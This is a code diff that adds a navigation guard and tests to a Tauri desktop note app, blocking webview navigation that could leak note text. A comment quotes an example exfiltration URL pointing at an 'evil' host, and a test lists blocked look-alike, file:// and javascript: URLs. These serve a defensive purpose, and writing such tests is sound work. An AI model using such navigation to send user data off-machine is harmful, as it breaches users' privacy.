@@ -43,6 +43,36 @@ fn notes_dir(corpus: &str) -> Result<PathBuf, String> {
     Ok(corpus_dir(corpus)?.join("notes"))
 }
 
+/// True for the app's own pages.  The CSP can't stop script from navigating the
+/// window (`location = "https://evil/?data=…"` would carry note text off-machine),
+/// so the navigation guard below refuses every other destination.
+fn is_app_url(url: &tauri::Url) -> bool {
+    match (url.scheme(), url.host_str()) {
+        ("tauri", Some("localhost"))                 => true,  // macOS / Linux bundle
+        ("http" | "https", Some("tauri.localhost"))  => true,  // Windows bundle
+        // `tauri dev` serves viz/ from a local dev server; only allowed in debug builds.
+        ("http", Some("127.0.0.1" | "localhost"))    => cfg!(debug_assertions),
+        _ => false,
+    }
+}
+
+/// Plugin whose only job is the navigation hook.  (Windows declared in
+/// tauri.conf.json have no builder to attach `on_navigation` to, so a plugin is
+/// the hook point; it runs before every navigation in every webview.)
+///
+/// Windows caveat: WebView2 sends the request *before* the cancel lands, so the
+/// guard alone keeps the window in the app but can't stop a URL from leaking.
+/// tauri.conf.json therefore also sets `additionalBrowserArgs` with
+/// `--proxy-server=127.0.0.1:9` — a proxy that doesn't exist (9 is the old "discard"
+/// port), so every real network request from the webview fails.  The app needs no network: its pages and IPC are
+/// served in-process, and loopback (the `tauri dev` server) always bypasses proxies.
+/// (The `--disable-features=…` part repeats wry's defaults, which the setting replaces.)
+fn navigation_guard<R: tauri::Runtime>() -> tauri::plugin::TauriPlugin<R> {
+    tauri::plugin::Builder::new("navigation-guard")
+        .on_navigation(|_webview, url| is_app_url(url))   // false = navigation cancelled
+        .build()
+}
+
 // ---- IPC COMMANDS ----
 
 /// Sanity-check the IPC channel.  The frontend uses this to confirm
@@ -117,12 +147,29 @@ mod tests {
         }
         assert!(notes_dir(std::env::temp_dir().to_str().unwrap()).is_err());
     }
+
+    #[test]
+    fn navigation_only_to_app_pages() {
+        let ok = |s: &str| is_app_url(&s.parse().unwrap());
+        assert!(ok("tauri://localhost/graph.html"));
+        assert!(ok("http://tauri.localhost/graph.html"));
+        for bad in [
+            "https://example.com/?leak=1",
+            "http://tauri.localhost.evil.com/",   // look-alike host
+            "http://evil.com/tauri.localhost",
+            "file:///C:/Windows/win.ini",
+            "javascript:alert(1)",
+        ] {
+            assert!(!ok(bad), "should block {bad:?}");
+        }
+    }
 }
 
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
 pub fn run() {
     tauri::Builder::default()
         .plugin(tauri_plugin_dialog::init())
+        .plugin(navigation_guard())
         .invoke_handler(tauri::generate_handler![
             ping,
             get_graph,
